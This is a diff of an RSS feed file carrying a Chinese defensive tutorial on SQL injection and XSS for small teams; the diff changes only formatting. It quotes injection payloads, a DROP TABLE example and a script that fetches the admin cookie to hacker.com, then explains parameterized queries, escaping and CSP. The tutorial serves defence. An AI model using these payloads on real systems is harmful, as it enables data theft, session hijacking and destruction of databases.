@@ -1,60 +1,57 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-    <channel>
-        <title>安全性设计：防止SQL注入与XSS攻击 on SelfTechHub</title>
-        <link>https://blog.irudder.me/tags/%E5%AE%89%E5%85%A8%E6%80%A7%E8%AE%BE%E8%AE%A1%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5%E4%B8%8EXSS%E6%94%BB%E5%87%BB.html</link>
-        <description>Recent content in 安全性设计：防止SQL注入与XSS攻击 on SelfTechHub</description>
-        <generator>Hugo -- gohugo.io</generator>
-        <language>zh-cn</language>
-        <lastBuildDate>Tue, 02 Aug 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.irudder.me/tags/%E5%AE%89%E5%85%A8%E6%80%A7%E8%AE%BE%E8%AE%A1%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5%E4%B8%8EXSS%E6%94%BB%E5%87%BB/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>别等库被删才哭：中小团队防SQL注入与XSS实战</title>
-        <link>https://blog.irudder.me/tech/zhongxiaoxingxiangmujiagoushejizhinan/anquanxingsheji_fangzhisqlzhuruyuxssgongji.html</link>
-        <pubDate>Tue, 02 Aug 2022 00:00:00 +0000</pubDate>
-        
-        <guid>https://blog.irudder.me/tech/zhongxiaoxingxiangmujiagoushejizhinan/anquanxingsheji_fangzhisqlzhuruyuxssgongji.html</guid>
-        <description>&lt;p&gt;还记得两年前的一个凌晨三点，我的手机像疯了一样震动。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>安全性设计：防止SQL注入与XSS攻击 on SelfTechHub</title><link>https://blog.irudder.me/tags/%E5%AE%89%E5%85%A8%E6%80%A7%E8%AE%BE%E8%AE%A1%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5%E4%B8%8EXSS%E6%94%BB%E5%87%BB.html</link><description>Recent content in 安全性设计：防止SQL注入与XSS攻击 on SelfTechHub</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Tue, 02 Aug 2022 00:00:00 +0800</lastBuildDate><atom:link href="https://blog.irudder.me/tags/%E5%AE%89%E5%85%A8%E6%80%A7%E8%AE%BE%E8%AE%A1%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5%E4%B8%8EXSS%E6%94%BB%E5%87%BB/index.xml" rel="self" type="application/rss+xml"/><item><title>别等库被删才哭：中小团队防SQL注入与XSS实战</title><link>https://blog.irudder.me/tech/zhongxiaoxingxiangmujiagoushejizhinan/anquanxingsheji_fangzhisqlzhuruyuxssgongji.html</link><pubDate>Tue, 02 Aug 2022 00:00:00 +0800</pubDate><guid>https://blog.irudder.me/tech/zhongxiaoxingxiangmujiagoushejizhinan/anquanxingsheji_fangzhisqlzhuruyuxssgongji.html</guid><description>&lt;p&gt;还记得两年前的一个凌晨三点，我的手机像疯了一样震动。&lt;/p&gt;
 &lt;p&gt;电话那头是运维老张，声音都在抖：“老李，咱们后台管理系统的首页被人挂了赌博广告，而且用户表刚才被批量导出了……”&lt;/p&gt;
 &lt;p&gt;我当时脑子“嗡”的一下，那是个刚上线不久的内部运营工具，大家都在赶进度，想着“反正是内网用，不用太讲究”。结果，就因为一个实习生为了省事，在搜索框里写了一句原生的SQL拼接，整个数据库差点被人连锅端。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://picsum.photos/800/450?random=1768456084481&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;配图&#34;
-	
-	
+&lt;p&gt;&lt;img src="https://picsum.photos/800/450?random=1768456084481"
+loading="lazy"
+alt="配图"
 &gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;哪怕是内网项目，也不能裸奔。&lt;/strong&gt; 这就是我今天要和大家聊的：在资源有限的中小团队，如何用最低的成本，堵住SQL注入和XSS这两个最大的窟窿。&lt;/p&gt;
-&lt;h2 id=&#34;这种省事的代码就是定时炸弹&#34;&gt;这种“省事”的代码，就是定时炸弹
+&lt;h2 id="这种省事的代码就是定时炸弹"&gt;这种“省事”的代码，就是定时炸弹
 &lt;/h2&gt;&lt;p&gt;咱们先说SQL注入。很多刚入行的兄弟，或者赶工期的老手，特别喜欢用字符串拼接来拼凑SQL语句。觉得直观、快。&lt;/p&gt;
 &lt;p&gt;但我亲眼见过一个真实的惨案。&lt;/p&gt;
 &lt;p&gt;那是我们给一家电商做的小程序后端。有个“按商品名称搜索”的功能。代码大概长这样：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;-- 典型的找死写法
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;String &lt;span style=&#34;color:#66d9ef&#34;&gt;sql&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SELECT * FROM products WHERE name = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; userName &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开发小哥觉得没问题啊，用户输入“苹果”，查出来的就是苹果。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;-- 典型的找死写法
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;sql&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;SELECT * FROM products WHERE name = &amp;#39;&amp;#34;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;userName&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;开发小哥觉得没问题啊，用户输入“苹果”，查出来的就是苹果。&lt;/p&gt;
 &lt;p&gt;直到有一天，有个竞争对手搞事情，在搜索框里输入了这么一串东西：
-&lt;code&gt;&#39; OR &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/p&gt;
+&lt;code&gt;' OR '1'='1&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;这句SQL瞬间变成了：
-&lt;code&gt;SELECT * FROM products WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;code&gt;SELECT * FROM products WHERE name = '' OR '1'='1'&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;因为 &lt;code&gt;1=1&lt;/code&gt; 永远成立，数据库把所有商品信息一股脑全吐了出来。更可怕的是，如果对方输入的是 &lt;code&gt;; DROP TABLE products; --&lt;/code&gt;，那你第二天上班可能就得准备简历了。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;怎么防？其实就一招：参数化查询（预编译）。&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;别去搞什么复杂的正则过滤，也别试图自己写函数去清洗关键词，你玩不过黑客的。直接交给数据库驱动去处理。&lt;/p&gt;
 &lt;p&gt;我就强制要求团队里所有涉及数据库操作的地方，必须用占位符。比如在Java里用 &lt;code&gt;PreparedStatement&lt;/code&gt;，或者如果你用MyBatis/MyBatis-Plus，确保你用的是 &lt;code&gt;#{}&lt;/code&gt; 而不是 &lt;code&gt;${}&lt;/code&gt;。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 正确姿势&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;String sql &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SELECT * FROM products WHERE name = ?&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PreparedStatement pstmt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; connection.&lt;span style=&#34;color:#a6e22e&#34;&gt;prepareStatement&lt;/span&gt;(sql);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pstmt.&lt;span style=&#34;color:#a6e22e&#34;&gt;setString&lt;/span&gt;(1, userName);
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这么做的原理很简单&lt;/strong&gt;：数据库会先把SQL语句的骨架编译好，把用户输入的内容仅仅当作“数据”填进去，而不是当作“命令”执行。不管用户输入多离谱的代码，它都只是一串普通的字符串。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// 正确姿势&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sql&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;SELECT * FROM products WHERE name = ?&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;PreparedStatement&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pstmt&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;prepareStatement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sql&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;pstmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;userName&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这么做的原理很简单&lt;/strong&gt;：数据库会先把SQL语句的骨架编译好，把用户输入的内容仅仅当作“数据”填进去，而不是当作“命令”执行。不管用户输入多离谱的代码，它都只是一串普通的字符串。&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;小思考&lt;/strong&gt;：你现在的项目里，不管是MyBatis还是JPA，有没有那种为了实现动态排序，偷偷用了 &lt;code&gt;${}&lt;/code&gt; 或者直接拼接字符串的地方？赶紧去搜一下全局代码。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;那些看不见的脚本专偷管理员cookie&#34;&gt;那些“看不见”的脚本，专偷管理员Cookie
+&lt;p&gt;&lt;strong&gt;小思考&lt;/strong&gt;：你现在的项目里，不管是MyBatis还是JPA，有没有那种为了实现动态排序，偷偷用了 &lt;code&gt;${}&lt;/code&gt; 或者直接拼接字符串的地方？赶紧去搜一下全局代码。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id="那些看不见的脚本专偷管理员cookie"&gt;那些“看不见”的脚本，专偷管理员Cookie
 &lt;/h2&gt;&lt;p&gt;聊完后端，再聊聊前端最头疼的XSS（跨站脚本攻击）。&lt;/p&gt;
 &lt;p&gt;很多人觉得 XSS 离自己很远，其实它就在你身边。&lt;/p&gt;
 &lt;p&gt;去年我接手过一个烂尾项目，是个论坛系统。有个用户发了个帖子，标题看起来很正常，但只要管理员一点进去审核，后台就会莫名其妙地卡顿一下。&lt;/p&gt;
 &lt;p&gt;后来复盘发现，那个标题里藏了一段隐形的 JavaScript 代码：
-&lt;code&gt;&amp;lt;script&amp;gt;fetch(&#39;http://hacker.com?cookie=&#39;+document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;code&gt;&amp;lt;script&amp;gt;fetch('http://hacker.com?cookie='+document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;因为系统没有对输出内容做转义，这段代码在管理员的浏览器里直接执行了。管理员的 Session ID 被发送到了黑客的服务器。黑客拿着这个 ID，直接伪装成管理员登录后台，把所有帖子都删了。&lt;/p&gt;
 &lt;p&gt;这就是典型的&lt;strong&gt;存储型 XSS&lt;/strong&gt;。&lt;/p&gt;
 &lt;p&gt;很多开发同学有个误区：&lt;strong&gt;“我在前端输入框限制了只能输入中文和数字，不就安全了吗？”&lt;/strong&gt;&lt;/p&gt;
@@ -69,25 +66,26 @@
 &lt;strong&gt;但也别大意&lt;/strong&gt;，比如 Vue 里的 &lt;code&gt;v-html&lt;/code&gt; 或者 React 里的 &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt;，这俩就是给 XSS 开的后门。除非万不得已（比如渲染富文本编辑器内容），&lt;strong&gt;千万别用&lt;/strong&gt;。&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;https://picsum.photos/800/450?random=1768456086339&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;配图&#34;
-	
-	
+&lt;p&gt;&lt;img src="https://picsum.photos/800/450?random=1768456086339"
+loading="lazy"
+alt="配图"
 &gt;&lt;/p&gt;
-&lt;ol start=&#34;2&#34;&gt;
+&lt;ol start="2"&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;strong&gt;给浏览器穿防弹衣：CSP（内容安全策略）&lt;/strong&gt;
 这是个被很多人忽略的神器。只需要在 HTTP 响应头里加一行配置，就能告诉浏览器：&lt;strong&gt;“只许执行我指定域名的脚本，其他的一律拦截。”&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Content-Security-Policy: default-src &amp;#39;self&amp;#39;; script-src &amp;#39;self&amp;#39; https://trusted.cdn.com;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我就遇到过一次，因为配置了 CSP，攻击者注入的脚本虽然在页面上了，但浏览器直接拒绝执行，控制台报了个红错，完美拦截。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-http" data-lang="http"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;Content-Security-Policy: default-src &amp;#39;self&amp;#39;; script-src &amp;#39;self&amp;#39; https://trusted.cdn.com;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我就遇到过一次，因为配置了 CSP，攻击者注入的脚本虽然在页面上了，但浏览器直接拒绝执行，控制台报了个红错，完美拦截。&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;h2 id=&#34;安全不是一次性的是种习惯&#34;&gt;安全不是一次性的，是种习惯
+&lt;h2 id="安全不是一次性的是种习惯"&gt;安全不是一次性的，是种习惯
 &lt;/h2&gt;&lt;p&gt;我在带团队的时候，每周五下午的代码走查（Code Review）环节，都会专门盯着这两点看。&lt;/p&gt;
 &lt;p&gt;时间久了，大家就形成了肌肉记忆：&lt;/p&gt;
 &lt;ul&gt;
@@ -103,9 +101,4 @@
 &lt;li&gt;&lt;strong&gt;全局搜索&lt;/strong&gt;：立刻在你的项目里搜索 &lt;code&gt;$&lt;/code&gt;（如果是MyBatis）或者 &lt;code&gt;+&lt;/code&gt;（如果是拼接SQL），排查有没有裸露的拼接。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;开启 CSP&lt;/strong&gt;：如果你的项目是 Web 端，尝试在 Nginx 或者后端代码里加上基础的 CSP 头，先开个 Report-Only 模式看看有多少违规脚本。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;慎用富文本&lt;/strong&gt;：如果业务必须用富文本编辑器，后端必须引入 &lt;code&gt;DOMPurify&lt;/code&gt; (JS) 或 &lt;code&gt;Jsoup&lt;/code&gt; (Java) 之类的库进行白名单过滤，&lt;strong&gt;绝对不能&lt;/strong&gt;原样存取。&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-        </item>
-        
-    </channel>
-</rss>
+&lt;/ol&gt;</description></item></channel></rss>
